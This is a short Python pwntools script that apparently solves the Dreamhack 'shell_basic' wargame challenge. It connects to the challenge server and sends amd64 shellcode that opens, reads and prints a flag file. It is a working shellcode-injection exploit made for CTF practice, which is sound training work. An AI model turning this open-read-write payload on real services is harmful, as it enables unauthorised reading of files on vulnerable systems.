from pwn import *

r = remote("host8.dreamhack.games", 10121)

context.arch = "amd64"

sc  = shellcraft.open("/home/shell_basic/flag_name_is_loooooong")
sc += shellcraft.read("rax", "rsp", 0x100)
sc += shellcraft.write(1, "rsp", 0x100)

payload = asm(sc)
r.send(payload)

print(r.recvall())
